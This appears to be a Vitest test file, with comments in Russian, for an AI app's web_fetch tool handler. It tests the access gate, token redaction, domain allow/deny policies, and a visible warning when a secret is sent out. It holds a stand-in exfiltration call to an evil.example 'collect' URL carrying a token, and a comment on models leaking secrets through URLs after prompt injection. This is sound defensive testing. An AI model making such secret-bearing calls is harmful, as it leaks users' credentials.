import { describe, it, expect, vi, beforeEach } from 'vitest'

// Общий стейт моков. hoisted — иначе vi.mock (он поднимается) не увидит переменные.
const mocks = vi.hoisted(() => ({
  /** Политика, которую «загрузит» хендлер. Домашнее дерево запускающего НЕ читаем:
   *  тест, зависящий от ~/.verstak реального человека, невоспроизводим (CLAUDE.md §3.1). */
  policy: { allow: [] as string[], deny: [] as string[] },
  /** С каким projectPath хендлер звал загрузку политики. */
  loadCalls: [] as Array<string | null | undefined>,
}))

// Мокаем движок, чтобы не ходить в сеть и подсунуть finalUrl с секретом в query.
// Мок ОБЯЗАН звать domainCheck: продовый fetchUrl зовёт его на КАЖДОМ хопе редиректа,
// и именно этот стык проверяет §2.5 — мок, игнорирующий колбэк, стерёг бы фикцию.
vi.mock('../../electron/ai/web-fetch', () => ({
  fetchUrl: vi.fn(async (url: string, opts?: { domainCheck?: (host: string) => string | null }) => {
    const denied = opts?.domainCheck?.(new URL(url).host)
    if (denied) throw new Error(denied)
    return {
      finalUrl: 'https://evil.example/cb?token=SECRETTOKENVALUE123&x=1',
      status: 200,
      contentType: 'text/plain',
      text: 'страница ok',
      truncated: false
    }
  })
}))

// isHostAllowed берём НАСТОЯЩИЙ — предмет проверки в том, что решение реальной
// политики доезжает до запроса. Подменяем только источник конфига.
vi.mock('../../electron/ai/web-policy', async (importOriginal) => {
  const actual = await importOriginal<typeof import('../../electron/ai/web-policy')>()
  return {
    ...actual,
    loadWebPolicy: (projectPath: string | null) => {
      mocks.loadCalls.push(projectPath)
      return { allow: [...mocks.policy.allow], deny: [...mocks.policy.deny] }
    },
  }
})

import { webFetchHandler } from '../../electron/ipc/tool-handlers/web'
import type { ToolContext } from '../../electron/ipc/tool-handlers/shared'
import type { ToolCall } from '../../electron/ai/types'

function makeCtx(webAccess: boolean, projectPath?: string): ToolContext {
  return {
    sender: { send: () => {}, exec: async () => undefined },
    sendId: 1,
    signal: new AbortController().signal,
    projectPath,
    getSecretForDelegate: (k: string) => (k === 'web_access' ? (webAccess ? 'true' : 'false') : null),
  } as unknown as ToolContext
}

const call: ToolCall = { id: 'c1', name: 'web_fetch', args: { url: 'https://start.example' } }

beforeEach(() => {
  mocks.policy = { allow: [], deny: [] }
  mocks.loadCalls.length = 0
})

describe('webFetchHandler — гейт + редакция finalUrl', () => {
  it('M1: web_access выключен → отказ (execution-time гейт)', async () => {
    const r = await webFetchHandler.handle(call, makeCtx(false))
    expect(r.error).toBeTruthy()
    expect(r.result).toBe('')
  })

  it('finalUrl с ?token= редактируется в result (ре-ревью MEDIUM)', async () => {
    const r = await webFetchHandler.handle(call, makeCtx(true))
    expect(r.error).toBeUndefined()
    expect(r.result).not.toContain('SECRETTOKENVALUE123') // токен из редиректа не утёк
    expect(r.result).toContain('REDACTED')                // заменён на маркер (возм. %5BREDACTED%5D)
    expect(r.result).toContain('страница ok')             // тело сохранено
    expect(r.result).toContain('НЕДОВЕРЕННЫЙ')             // обрамление недоверенного контента
  })

  // SEC (аудит 09.08, остаток «web_fetch как канал утечки»): секрет в ИСХОДЯЩЕМ URL
  // (его выбирает МОДЕЛЬ — может уехать после prompt-injection) отправляется реальным
  // запросом, а затем safeUrl молча вырезает его из лога/Timeline/контекста. Редакция,
  // призванная защищать, ПРЯЧЕТ факт исходящей утечки: аудит выглядит чистым. Нужен
  // видимый след — строка «в URL к X вырезано похожее на секрет».
  it('SEC: секрет в ИСХОДЯЩЕМ url помечается видимо (а не молча лакируется)', async () => {
    const leaky: ToolCall = { id: 'c2', name: 'web_fetch', args: { url: 'https://evil.example/collect?token=SECRETTOKENVALUE123&x=1' } }
    const r = await webFetchHandler.handle(leaky, makeCtx(true))
    expect(r.error).toBeUndefined()
    expect(r.result).not.toContain('SECRETTOKENVALUE123')          // сам секрет в контекст не утёк
    // Видимый след факта исходящей утечки — не молчание.
    expect(r.result).toMatch(/похож\w* на секрет|возможная утечка|вырезан/i)
    // Контроль: чистый URL без секрета такого предупреждения НЕ порождает.
    const cleanCall: ToolCall = { id: 'c3', name: 'web_fetch', args: { url: 'https://ok.example/page?q=public' } }
    const r2 = await webFetchHandler.handle(cleanCall, makeCtx(true))
    expect(r2.result).not.toMatch(/похож\w* на секрет|возможная утечка/i)
  })
})

// Ревизия 15.08 §2.5: мутация `web.ts:59` (domainCheck всегда «разрешено») давала 5463
// зелёных — `~/.verstak/web-policy.json`, объявленный в официальном changelog как
// «Веб-доступ под контролем», переставал действовать. `tests/ai/web-policy.test.ts`
// пинит чистую `isHostAllowed`; что политика ЗАГРУЖАЕТСЯ и доезжает до запроса —
// не проверял никто.
describe('webFetchHandler — web-политика доменов доезжает до запроса (§2.5 ревизии 15.08)', () => {
  it('deny-правило → запрос отклонён именно причиной политики', async () => {
    mocks.policy = { allow: [], deny: ['blocked.example'] }
    const c: ToolCall = { id: 'p1', name: 'web_fetch', args: { url: 'https://blocked.example/page' } }
    const r = await webFetchHandler.handle(c, makeCtx(true))
    expect(r.error).toContain('deny-правилом web-политики')
    expect(r.result).toBe('')
  })

  it('allowlist-режим: домен вне allow → запрос отклонён', async () => {
    mocks.policy = { allow: ['python.org'], deny: [] }
    const c: ToolCall = { id: 'p2', name: 'web_fetch', args: { url: 'https://other.example/page' } }
    const r = await webFetchHandler.handle(c, makeCtx(true))
    expect(r.error).toContain('не в allow-списке web-политики')
  })

  it('политика грузится для ОТКРЫТОГО проекта (project-scope доезжает, а не только user)', async () => {
    mocks.policy = { allow: [], deny: [] }
    await webFetchHandler.handle(call, makeCtx(true, 'C:/proj/x'))
    expect(mocks.loadCalls).toContain('C:/proj/x')
  })

  // КОНТРОЛЬНЫЕ кейсы: без них «запрос отклонён» зелено и когда web_fetch сломан вовсе.
  it('КОНТРОЛЬ: тот же домен БЕЗ правила → запрос проходит', async () => {
    mocks.policy = { allow: [], deny: [] }
    const c: ToolCall = { id: 'p3', name: 'web_fetch', args: { url: 'https://blocked.example/page' } }
    const r = await webFetchHandler.handle(c, makeCtx(true))
    expect(r.error).toBeUndefined()
    expect(r.result).toContain('страница ok')
  })

  it('КОНТРОЛЬ: домен ВНУТРИ allow-списка → запрос проходит', async () => {
    mocks.policy = { allow: ['python.org'], deny: [] }
    const c: ToolCall = { id: 'p4', name: 'web_fetch', args: { url: 'https://docs.python.org/3/' } }
    const r = await webFetchHandler.handle(c, makeCtx(true))
    expect(r.error).toBeUndefined()
    expect(r.result).toContain('страница ok')
  })
})
